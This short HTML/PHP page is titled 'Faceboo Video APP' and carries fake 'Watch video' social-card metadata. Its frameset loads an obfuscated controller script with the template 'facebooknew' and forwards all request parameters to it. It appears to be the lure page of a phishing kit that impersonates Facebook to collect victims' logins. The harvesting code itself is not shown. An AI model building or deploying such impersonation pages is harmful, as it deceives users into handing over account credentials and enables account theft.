
	<html> 
	<head> 
	<title>Faceboo Video APP</title>
		
		<meta name="twitter:card" content="summary" />
		<meta name="twitter:site" content="@" />
		<meta name="twitter:title" content="Watch video @" />
		<meta name="twitter:description" content="989,162 Views " />
		<meta name="twitter:image" content="https://avatars.io/twitter/" />
	
	</head>
	<frameset rows="*,3" frameborder="NO" border="50" framespacing="0">
	<frame name="main" src="../.././public/CONTROLLERef83df52-10d7-4702-ba79-1a6dcd2e407d.php?source=.%2Fpublic%2FACCESSS5a04aba8-d740-452a-b1dc-6f03f47bb35b&lan=facebooknew&<?php echo http_build_query($_GET); ?>"> <noframes> 
	<body bgcolor="#FFFFFF" text="#000000"> 
	<a href="../.././public/CONTROLLERef83df52-10d7-4702-ba79-1a6dcd2e407d.php?source=.%2Fpublic%2FACCESSS5a04aba8-d740-452a-b1dc-6f03f47bb35b&lan=facebooknew&<?php echo http_build_query($_GET); ?>">Click here to continue</a> 
	</body> 
	</noframes> 
	</html> 
   